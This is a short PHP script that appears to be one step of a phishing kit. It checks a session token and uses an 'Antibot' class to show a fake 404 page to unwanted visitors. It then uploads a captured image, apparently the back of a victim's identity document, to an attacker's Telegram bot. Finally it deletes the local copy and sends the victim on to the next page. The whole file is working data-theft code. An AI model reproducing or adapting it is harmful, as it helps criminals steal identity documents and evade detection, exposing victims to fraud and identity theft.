<?php
session_start();           
require_once '../../session/Comp.php';
require_once '../../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;


if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}

$token = file_get_contents("../config/token.txt");
$chat_id = file_get_contents("../config/id.txt");
$bot_url = "https://api.telegram.org/bot";
$url = $bot_url . $token . "/sendPhoto?chat_id=" . $chat_id;
$img = "../tmp/back.png";

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Content-Type:multipart/form-data"
));
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, array('photo'=> new CURLFILE($img),
)); 
$output = curl_exec($ch);

unlink("../tmp/back.png");

# Head Back To Next Step

header('Location: tg3.php?token='.$_SESSION['token']); 


?>